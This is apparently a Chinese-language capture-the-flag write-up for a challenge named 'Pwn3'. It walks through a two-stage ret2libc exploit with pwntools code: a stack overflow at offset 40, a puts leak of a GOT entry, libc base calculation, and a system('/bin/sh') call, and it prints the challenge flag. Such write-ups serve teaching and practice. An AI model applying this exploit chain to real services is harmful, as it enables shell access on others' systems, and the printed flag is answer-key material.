# Pwn3

## 题目简述

程序只留下栈溢出和一个 `pop rdi; ret` gadget，没有 `system@plt` 或可直接使用的命令字符串。需要先泄露 libc 地址，再执行第二阶段 ret2libc。

## 解题过程

返回地址偏移为 40。第一阶段调用 `puts(puts@got)`，再回到 `main` 接收下一次输入：

```python
rop = ROP(elf)
rop.raw(b"A" * 40)
rop.puts(elf.got.puts)
rop.main()
io.sendline(rop.chain())
```

跳过程序打印的假 flag，解析泄露的 `puts` 地址，并用与远端匹配的 libc 计算基址：

```python
libc.address = leaked_puts - libc.symbols.puts
```

第二阶段在 libc 中寻找 `/bin/sh\x00`，调用 `system`；必要时先放一个单独的 `ret` 做栈对齐：

```python
rop = ROP(libc)
rop.raw(b"A" * 40)
rop.raw(p64(0x40101a))
rop.system(next(libc.search(b"/bin/sh\x00")))
io.sendline(rop.chain())
```

最终得到：

```text
n00bz{1f_y0u_h4ve_n0th1ng_y0u_h4ve_l1bc}
```

## 方法总结

ret2libc 的两阶段结构是“泄露已知符号 → 计算基址 → 调用 libc”。本地 libc 不能默认等同远端版本，必须使用题目容器或泄露对应的库文件。
